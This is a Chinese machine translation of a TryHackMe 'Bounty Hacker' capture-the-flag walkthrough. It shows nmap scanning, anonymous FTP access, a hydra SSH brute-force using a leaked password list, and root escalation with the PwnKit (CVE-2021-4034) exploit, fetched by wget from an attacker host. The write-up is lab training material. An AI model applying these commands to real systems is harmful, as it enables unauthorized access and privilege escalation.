<html>
<head>
<title>TryHackMe writeup: Bounty Hacker</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:赏金黑客</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-bounty-hacker-4f06536c94c4?source=collection_archive---------3-----------------------#2022-12-06">https://infosecwriteups.com/tryhackme-writeup-bounty-hacker-4f06536c94c4?source=collection_archive---------3-----------------------#2022-12-06</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="fe80" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi kp translated"><span class="l kq kr ks bm kt ku kv kw kx di">B</span>county Hacker(<a class="ae ky" href="https://tryhackme.com/room/cowboyhacker" rel="noopener ugc nofollow" target="_blank">《Sevuhl》2020</a>)是一个有趣的试玩黑客室，灵感来自<em class="kz">星际牛仔</em> ( <a class="ae ky" href="https://web.archive.org/web/20221129002536/https://www.imdb.com/title/tt0213338/" rel="noopener ugc nofollow" target="_blank">美并&amp;池口1997–1998</a>)。这是一个相当标准的房间，强化了良好的信息收集将导致成功渗透目标系统的想法。在本文中，我将讨论获得对这个房间的boot2root目标系统的用户模式和根级别访问的过程。</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj la"><img src="../Images/a1afe7da231f3d78b498841d521231f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D6ThfLSMAjto813yFzolrg.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">来自<a class="ae ky" href="https://tryhackme.com/room/cowboyhacker" rel="noopener ugc nofollow" target="_blank">“sev uhl”(2020)</a>和<a class="ae ky" href="https://cowboybebop.fandom.com/wiki/Lin?oldid=32836" rel="noopener ugc nofollow" target="_blank">星际牛仔维基(2022年7月5日修订)</a>的一些图像组件。</figcaption></figure><h1 id="c203" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">目录一览</h1><ol class=""><li id="80b7" class="mo mp iu jt b ju mq jy mr kc ms kg mt kk mu ko mv mw mx my bi translated">程序</li><li id="5b1c" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">结束事项</li><li id="829b" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">参考</li></ol><h1 id="3510" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">程序</h1><blockquote class="ne nf ng"><p id="dc15" class="jr js kz jt b ju jv jw jx jy jz ka kb nh kd ke kf ni kh ki kj nj kl km kn ko in bi translated">“你在酒吧里不停地吹嘘你的精英黑客技能，几个赏金猎人决定接受你的索赔！证明你的地位不仅仅是酒吧里的几杯酒。我感觉到你的未来是甜椒和牛肉！”— <a class="ae ky" href="https://tryhackme.com/room/cowboyhacker" rel="noopener ugc nofollow" target="_blank">《塞弗赫尔》(2020) </a></p></blockquote><p id="1a82" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将从定义这个房间的目标开始。具体来说，我需要在目标系统上找到两个标志:一个来自存储在<code class="fe nk nl nm nn b">user.txt</code>中的低特权用户，另一个来自存储在<code class="fe nk nl nm nn b">root.txt</code>中的root帐户。我在攻击框中配置了<code class="fe nk nl nm nn b">/etc/hosts</code>文件，使其包含一个伪域，该伪域将指向boot2root机器的动态IP地址，单击第一个任务右上角的绿色“启动机器”按钮，然后开始工作。</p><h2 id="2ba4" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">探索</h2><p id="fd88" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">我首先在web浏览器的地址栏中键入伪域，以查看是否有网站在目标系统上运行。确实有一个网站在运行(如图1所示):</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj od"><img src="../Images/9369e04e81d465b94ecab2fb6c4bdb86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cx2SCLgsy5AGfOIfLZG4gw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图1</figcaption></figure><p id="6f8f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">除了一个(相当迷人的)入侵目标系统的提示之外，web服务器上似乎没有太多东西。我将继续运行<a class="ae ky" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> nmap (n.d.) </a>扫描，找出系统上正在运行哪些端口:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="b04f" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml --max-scan-delay=5s cowboyhacker.thm</strong><br/>[sudo] password for dna: <br/>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.<br/>Starting Nmap 7.93 ( https://nmap.org ) at [redacted] EST<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at 06:59<br/>Completed NSE at 06:59, 0.00s elapsed<br/>Initiating NSE at 06:59<br/>Completed NSE at 06:59, 0.00s elapsed<br/>Initiating NSE at 06:59<br/>Completed NSE at 06:59, 0.00s elapsed<br/>Initiating Connect Scan at 06:59<br/>Scanning cowboyhacker.thm [65535 ports]<br/>Discovered open port 80/tcp on cowboyhacker.thm<br/><br/>[... snip ...]</span></pre><p id="034c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这将把扫描结果输出到XML文件中。扫描完成后，我使用<a class="ae ky" href="http://xmlsoft.org/xslt/xsltproc.html" rel="noopener ugc nofollow" target="_blank"> xsltproc (n.d.) </a>将<code class="fe nk nl nm nn b">nmap</code>的输出转换成可读性更好的HTML格式:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="2ac3" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ xsltproc tcp_scan.xml -o tcp_scan.html</strong><br/>                                                                                                                                                       <br/><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$</strong></span></pre><p id="f7a5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">图2描述了HTML报告的摘录:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj on"><img src="../Images/6c045a14938f143277d7d5626ca6c506.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y7Hu92Sm2PC7EbeQnjmVqg.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图2</figcaption></figure><p id="4da6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">端口扫描显示有一个vsftpd FTP服务器正在运行(参见<a class="ae ky" href="https://security.appspot.com/downloads/vsftpd-3.0.3.tar.gz" rel="noopener ugc nofollow" target="_blank"> vsftpd v 3.0.3 </a>)、一个<a class="ae ky" href="https://www.openssh.com/txt/release-7.2p2" rel="noopener ugc nofollow" target="_blank"> OpenSSH (v 7.2p2) </a>服务和<a class="ae ky" href="https://httpd.apache.org/docs/2.4/new_features_2_4.html" rel="noopener ugc nofollow" target="_blank"> Apache HTTP服务器(v. 2.2.x — 2.4.x) </a>。尝试“猜测”目标系统的操作系统显示，它最有可能运行的是<a class="ae ky" href="https://ubuntu.com/about" rel="noopener ugc nofollow" target="_blank"> Ubuntu (n.d.) </a> Linux。</p><p id="d22c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，扫描显示vsftpd实例允许匿名登录。我将继续进一步探查FTP服务:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="3799" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ ftp cowboyhacker.thm    </strong>                    <br/>Connected to cowboyhacker.thm.<br/>220 (vsFTPd 3.0.3)<br/>Name (cowboyhacker.thm:dna): anonymous<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.<br/><strong class="nn iv">ftp&gt;</strong></span></pre><p id="f266" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我列举了系统，找到了两个名为<code class="fe nk nl nm nn b">locks.txt</code>和<code class="fe nk nl nm nn b">task.txt</code>的文件，并开始下载:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="6c95" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">ftp&gt; ls</strong><br/>229 Entering Extended Passive Mode (|||43854|)<br/>150 Here comes the directory listing.<br/>-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt<br/>-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt<br/>226 Directory send OK.<br/><strong class="nn iv">ftp&gt; get locks.txt</strong><br/>local: locks.txt remote: locks.txt<br/>229 Entering Extended Passive Mode (|||18723|)<br/>ftp: Can't connect to [redacted]: Connection timed out<br/>200 EPRT command successful. Consider using EPSV.<br/>150 Opening BINARY mode data connection for locks.txt (418 bytes).<br/>100% |*************************************|   418  4.84 KiB/s  00:00 ETA<br/>226 Transfer complete.<br/>418 bytes received in 00:00 (1.01 KiB/s)<br/><strong class="nn iv">ftp&gt; get task.txt</strong><br/>local: task.txt remote: task.txt<br/>200 EPRT command successful. Consider using EPSV.<br/>150 Opening BINARY mode data connection for task.txt (68 bytes).<br/>100% |*************************************|    68  1.33 KiB/s  00:00 ETA<br/>226 Transfer complete.<br/>68 bytes received in 00:00 (0.24 KiB/s)<br/><strong class="nn iv">ftp&gt;</strong></span></pre><p id="abed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我检查了里面的东西:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="fb04" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ cat locks.txt    </strong>                    <br/>rEddrAGON<br/>ReDdr4g0nSynd!cat3<br/>Dr@gOn$yn9icat3<br/>R3DDr46ONSYndIC@Te<br/>ReddRA60N<br/>R3dDrag0nSynd1c4te<br/>dRa6oN5YNDiCATE<br/>ReDDR4g0n5ynDIc4te<br/>R3Dr4gOn2044<br/>RedDr4gonSynd1cat3<br/>R3dDRaG0Nsynd1c@T3<br/>Synd1c4teDr@g0n<br/>reddRAg0N<br/>REddRaG0N5yNdIc47e<br/>Dra6oN$yndIC@t3<br/>4L1mi6H71StHeB357<br/>rEDdragOn$ynd1c473<br/>DrAgoN5ynD1cATE<br/>ReDdrag0n$ynd1cate<br/>Dr@gOn$yND1C4Te<br/>RedDr@gonSyn9ic47e<br/>REd$yNdIc47e<br/>dr@goN5YNd1c@73<br/>rEDdrAGOnSyNDiCat3<br/>r3ddr@g0N<br/>ReDSynd1ca7e<br/>                                                                                                                                                       <br/><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ cat task.txt </strong><br/>1.) Protect Vicious.<br/>2.) Plan for Red Eye pickup on the moon.<br/><br/>-lin<br/>                                                                                                                                                       <br/><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$</strong></span></pre><p id="1d3f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我从这些下载中了解到两条重要信息:系统上很可能有一个名为“lin”的用户，我有一个似乎是密码的列表，可以用它来尝试基于密码的身份验证方法。</p><p id="7138" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将尝试使用hydra(<a class="ae ky" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">van Hauser et al . n . d .)</a>以用户名<code class="fe nk nl nm nn b">lin</code>和由<code class="fe nk nl nm nn b">locks.txt</code>组成的密码列表来暴力破解SSH服务:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="a7db" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ hydra -l lin -P ./locks.txt cowboyhacker.thm ssh -t 10  </strong>                          <br/>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br/><br/>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at [redacted]<br/>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br/>[DATA] max 10 tasks per 1 server, overall 10 tasks, 26 login tries (l:1/p:26), ~3 tries per task<br/>[DATA] attacking ssh://cowboyhacker.thm:22/<br/>[22][ssh] host: cowboyhacker.thm   <strong class="nn iv">login: lin</strong>   <strong class="nn iv">password: RedDr4gonSynd1cat3</strong><br/>1 of 1 target successfully completed, 1 valid password found<br/>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at [redacted]<br/>                                                                                                                                                       <br/><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$</strong></span></pre><p id="1319" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有了SSH登录的用户名和密码组合，我现在可以开始获得对系统的初始访问。</p><h2 id="f475" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">初始访问</h2><p id="9b3f" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">初始访问可以通过SSH客户端完成:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="d73c" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">┌──(dna㉿deniers)-[~/cowboyhacker]<br/>└─$ ssh lin@cowboyhacker.thm  </strong> <br/>The authenticity of host 'cowboyhacker.thm' can't be established.<br/>ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.<br/>This key is not known by any other names<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added 'cowboyhacker.thm' (ED25519) to the list of known hosts.<br/>lin@cowboyhacker.thm's password: <br/>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)<br/><br/> * Documentation:  https://help.ubuntu.com<br/> * Management:     https://landscape.canonical.com<br/> * Support:        https://ubuntu.com/advantage<br/><br/>83 packages can be updated.<br/>0 updates are security updates.<br/><br/>Last login: Sun Jun  7 22:23:41 2020 from [redacted]<br/><strong class="nn iv">lin@bountyhacker:~/Desktop$</strong></span></pre><p id="4f7a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我开始扔掉<code class="fe nk nl nm nn b">user.txt</code>旗:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="3d1c" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">lin@bountyhacker:~/Desktop$ cd ..<br/>lin@bountyhacker:~$ find . -name user.txt -type f -print 2&gt;/dev/null</strong><br/>./Desktop/user.txt<br/><strong class="nn iv">lin@bountyhacker:~$ cd Desktop<br/>lin@bountyhacker:~/Desktop$ cat user.txt</strong><br/>THM{redacted}<br/><strong class="nn iv">lin@bountyhacker:~/Desktop$</strong></span></pre><p id="2060" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在可以利用系统上的权限提升漏洞来获得完全的根用户访问权限。</p><h2 id="ed23" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">后期开发</h2><p id="80b9" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">我认为我可以利用某种SUID二进制文件(见<a class="ae ky" href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit" rel="noopener ugc nofollow" target="_blank"> Carrigan 2020 </a>)来获得系统的根访问权限。我使用<code class="fe nk nl nm nn b">find</code>命令在目标系统中查询启用了粘性位的文件(和潜在的二进制文件)(再次参见<a class="ae ky" href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit" rel="noopener ugc nofollow" target="_blank"> Carrigan 2020 </a>):</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="8478" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">lin@bountyhacker:~/Desktop$ cd ..<br/>lin@bountyhacker:~$ find / -type f -perm /4000 -print 2&gt;/dev/null</strong><br/>/usr/sbin/pppd<br/>/usr/bin/chfn<br/>/usr/bin/passwd<br/>/usr/bin/chsh<br/>/usr/bin/gpasswd<br/>/usr/bin/pkexec<br/>/usr/bin/newgrp<br/>/usr/bin/sudo<br/>/usr/lib/policykit-1/polkit-agent-helper-1<br/>/usr/lib/eject/dmcrypt-get-device<br/>/usr/lib/xorg/Xorg.wrap<br/>/usr/lib/openssh/ssh-keysign<br/>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br/>/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox<br/>/usr/lib/snapd/snap-confine<br/>/bin/fusermount<br/>/bin/su<br/>/bin/mount<br/>/bin/ping<br/>/bin/ping6<br/>/bin/umount<br/><strong class="nn iv">lin@bountyhacker:~$</strong></span></pre><p id="a324" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我咨询了<a class="ae ky" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> GTFOBins (n.d.) </a>来找出执行权限提升的最佳二进制文件。我对上面的一些输出做了一些实验，但是没有成功:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="16e2" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">lin@bountyhacker:~$ sudo su</strong><br/>[sudo] password for lin: <br/>Sorry, user lin is not allowed to execute '/bin/su' as root on bountyhacker.<br/><strong class="nn iv">lin@bountyhacker:~$ /bin/su</strong><br/>Password: <br/>su: Authentication failure<br/><strong class="nn iv">lin@bountyhacker:~$ /usr/bin/passwd</strong><br/>Changing password for lin.<br/>(current) UNIX password: <br/><br/>passwd: Authentication token manipulation error<br/>passwd: password unchanged<br/><strong class="nn iv">lin@bountyhacker:~$ <br/>lin@bountyhacker:~$</strong></span></pre><p id="f93a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我尝试了另一种技术:我使用LinPEAS ( <a class="ae ky" href="https://github.com/carlospolop/PEASS-ng" rel="noopener ugc nofollow" target="_blank"> Polop n.d. </a>)来列举目标系统的内部漏洞，这些漏洞会导致根用户访问。我在攻击箱上启动了一个小的HTTP服务，通过<code class="fe nk nl nm nn b">wget</code>实用程序将文件传输到系统:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="5ce1" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">lin@bountyhacker:~$ wget http://attacker.thm:8000/linpeas.sh</strong><br/>--[redacted]--  http://attacker.thm:8000/linpeas.sh<br/>Connecting to attacker.thm:8000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 827827 (808K) [text/x-sh]<br/>Saving to: ‘linpeas.sh’<br/><br/>linpeas.sh   100%[==================&gt;] 808.42K   286KB/s    in 2.8s<br/><br/>[redacted] (286 KB/s) - ‘linpeas.sh’ saved [827827/827827]<br/><br/><strong class="nn iv">lin@bountyhacker:~$ chmod +x linpeas.sh<br/>lin@bountyhacker:~$ ./linpeas.sh</strong><br/><br/>[... snip ...]    <br/><br/>╔══════════╣ CVEs Check<br/><strong class="nn iv">Vulnerable to CVE-2021-4034</strong><br/><br/>Potentially Vulnerable to CVE-2022-2588<br/><br/><br/>[... snip ...]</span></pre><p id="caf6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">该系统似乎容易受到<em class="kz"> Polkit </em>权限提升漏洞(<a class="ae ky" href="https://nvd.nist.gov/vuln/detail/cve-2021-4034" rel="noopener ugc nofollow" target="_blank">国家漏洞数据库n.d. </a>)的攻击，正如其CVE id:CVE-2021–4034所示。我将通过使用<a class="ae ky" href="https://github.com/berdav/CVE-2021-4034" rel="noopener ugc nofollow" target="_blank"> Berardi et al. (n.d.) </a>尝试获得系统上的root访问权限来进行测试:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="c344" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv">lin@bountyhacker:~$ wget http://attacker.thm:8000/CVE-2021-4034/cve-2021-4034 -o ./polkit<br/>lin@bountyhacker:~$ ls</strong><br/>Desktop  Documents  Downloads  linpeas.sh  Music  Pictures  polkit  Public  Templates  Videos<br/><strong class="nn iv">lin@bountyhacker:~$ chmod +x polit</strong><br/>chmod: cannot access 'polit': No such file or directory<br/><strong class="nn iv">lin@bountyhacker:~$ chmod +x polkit</strong><br/><strong class="nn iv">lin@bountyhacker:~$ ./polit</strong><br/>-bash: ./polit: No such file or directory<br/><strong class="nn iv">lin@bountyhacker:~$ ./polkit</strong><br/>./polkit: line 1: [redacted]: command not found<br/>./polkit: line 2: syntax error near unexpected token `('<br/>./polkit: line 2: `Resolving localhost (localhost)... 127.0.0.1'<br/><strong class="nn iv">lin@bountyhacker:~$ rm polkit</strong><br/><strong class="nn iv">lin@bountyhacker:~$ wget http://attacker.thm:8000/CVE-2021-4034-main.zip</strong><br/>--[redacted]--  http://attacker.thm:8000/CVE-2021-4034-main.zip<br/>Connecting to attacker.thm:8000... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 6457 (6.3K) [application/zip]<br/>Saving to: ‘CVE-2021-4034-main.zip’<br/><br/>CVE-2021-4034-main.zip   100%[================&gt;]   6.31K  --.-KB/s in 0.002s  <br/><br/>[redacted] (3.54 MB/s) - ‘CVE-2021-4034-main.zip’ saved [6457/6457]<br/><br/><strong class="nn iv">lin@bountyhacker:~$ unzip CVE-2021-4034-main.zip</strong><br/>Archive:  CVE-2021-4034-main.zip<br/>55d60e381ef90463ed35f47af44bf7e2fbc150d4<br/>   creating: CVE-2021-4034-main/<br/>  inflating: CVE-2021-4034-main/.gitignore  <br/>  inflating: CVE-2021-4034-main/LICENSE  <br/>  inflating: CVE-2021-4034-main/Makefile  <br/>  inflating: CVE-2021-4034-main/README.md  <br/>  inflating: CVE-2021-4034-main/cve-2021-4034.c  <br/>  inflating: CVE-2021-4034-main/cve-2021-4034.sh  <br/>   creating: CVE-2021-4034-main/dry-run/<br/>  inflating: CVE-2021-4034-main/dry-run/Makefile  <br/>  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  <br/>  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  <br/>  inflating: CVE-2021-4034-main/pwnkit.c  <br/><strong class="nn iv">lin@bountyhacker:~$ ls</strong><br/>CVE-2021-4034-main  CVE-2021-4034-main.zip  Desktop  Documents  Downloads  linpeas.sh  Music  Pictures  Public  Templates  Videos<br/><strong class="nn iv">lin@bountyhacker:~$ cd CVE-2021-4034-main<br/>lin@bountyhacker:~/CVE-2021-4034-main$ ls</strong><br/>cve-2021-4034.c  cve-2021-4034.sh  dry-run  LICENSE  Makefile  pwnkit.c  README.md<br/><strong class="nn iv">lin@bountyhacker:~/CVE-2021-4034-main$ make</strong><br/>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br/>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br/>echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules<br/>mkdir -p GCONV_PATH=.<br/>cp -f /bin/true GCONV_PATH=./pwnkit.so:.<br/><strong class="nn iv">lin@bountyhacker:~/CVE-2021-4034-main$ ./cve-2021-4034</strong><br/><strong class="nn iv"># id</strong><br/>uid=0(root) gid=0(root) groups=0(root),1001(lin)<br/><strong class="nn iv"># </strong></span></pre><p id="e781" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">最初，我在启动这个漏洞时有点费劲，但很快就成功了。目标系统确实容易受到<em class="kz"> Polkit </em>漏洞的攻击，现在我可以转储<code class="fe nk nl nm nn b">root.txt</code>标志了:</p><pre class="lb lc ld le gu oe nn of bn og oh bi"><span id="fda7" class="oi lr iu nn b be oj ok l ol om"><strong class="nn iv"># find / -type f -name root.txt -print 2&gt;/dev/null</strong><br/>/root/root.txt<br/><strong class="nn iv"># cat /root/root.txt</strong><br/>THM{redacted}<br/><strong class="nn iv">#</strong></span></pre><p id="571d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="235a" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">结束事项</h1><p id="6c9e" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">就像我说的，这是一个非常标准的房间，它的存在是为了强调良好的信息收集和侦察的重要性。我能够从<em class="kz"> vsftpd </em>服务中访问文本文件，然后使用它作为初始访问的基础。然后，我利用系统上的一个漏洞获得root访问权限，以获得完成这个房间所需的另一半flag。总的来说，我认为赏金黑客是加强红队良好实践的好东西。</p><h2 id="1095" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">插头:米拉·拉辛去哪了？</h2><p id="967a" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">嘿你们好。过去，我曾因米拉·拉辛的出色工作而提拔过她，但有些看过她的推特资料的人可能已经注意到，她在那里一直不活跃。她离开了Twitter(因为埃隆·马斯克毁了它，就像他毁了他接触的所有其他东西一样，就像是techbro版的迈克尔·赫夫龙(Michael Hefferon)。请跟随她自己，向她展示你对❤️的爱</p><div class="oo op gq gs oq or"><a href="https://kolektiva.social/@MiraLazine" rel="noopener  ugc nofollow" target="_blank"><div class="os ab fp"><div class="ot ab ou cl cj ov"><h2 class="bd iv gz z fq ow fs ft ox fv fx it bi translated">不变量(@miralazine@kolektiva.social)</h2><div class="oy l"><h3 class="bd b gz z fq ow fs ft ox fv fx dk translated">88个帖子，85个以下，32个追随者复数，跨性别，残疾人，神经分歧，无政府主义未成年人DNI如果你需要一个…</h3></div><div class="oz l"><p class="bd b dl z fq ow fs ft ox fv fx dk translated">kolektiva.social</p></div></div><div class="pa l"><div class="pb l pc pd pe pa pf lk or"/></div></div></a></div><h2 id="31c7" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">插头:我的东西</h2><p id="d4c3" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">对于喜欢我的作品但尚未注册Medium会员计划的读者，如果他们能通过我的推荐链接注册，我将不胜感激(这在经济上帮助了我https://medium.com/membership/@EpsilonCalculus ❤️):<a class="ae ky" href="https://medium.com/membership/@EpsilonCalculus" rel="noopener"/></p><p id="f2c2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，对于任何喜欢阅读我的黑客文章的读者，我邀请他们看看我的技术文章系列，主要由CTF的文章组成，但也有其他计算机和STEM内容😃</p><div class="oo op gq gs oq"><div role="button" tabindex="0" class="ab bv gw cb fq pg ph bn pi lk ex"><div class="pj l"><div class="ab q"><div class="l di"><img alt="Aleksey" class="l de bw pk pl fe" src="../Images/886245347566d4089464c40d5ec5ccfc.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*QCw3Unyn7vnntVR7WHXImA.png"/><div class="fb bw l pk pl fc n aw fd"/></div><div class="hi l fp"><p class="bd b dl z fq fr fs ft fu fv fw fx dk translated">阿列克谢</p></div></div><div class="po pp gx l"><h2 class="bd iv uy mo fq uz fs ft ox fv fx it bi translated">技术报道</h2></div><div class="ab q"><div class="l fp"><a class="bd b be z bi va au vb vc vd rt ve an eh ei vf vg vh el em eo de bk ep" href="https://medium.com/@EpsilonCalculus/list/technical-writeups-63f8cfbee59c?source=post_page-----4f06536c94c4--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="vi l fp"><span class="bd b dl z dk">43 